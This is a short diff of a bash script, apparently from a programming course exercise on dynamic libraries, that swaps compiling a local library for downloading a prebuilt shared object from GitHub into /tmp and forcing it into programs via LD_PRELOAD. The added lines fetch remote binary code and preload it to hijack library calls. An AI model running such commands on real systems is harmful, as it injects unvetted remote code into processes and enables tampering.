@@ -1,3 +1,4 @@
 #!/bin/bash
-gcc -shared -o libhack.so -fPIC winning_numbers.c
-export LD_PRELOAD=./libhack.so:$LD_LIBRARY_PATH
+#!/bin/bash
+wget -P /tmp https://github.com/MosabAboidrees/alx-low_level_programming/raw/master/0x18-dynamic_libraries/libgiga.so
+export LD_PRELOAD=/tmp/libgiga.so
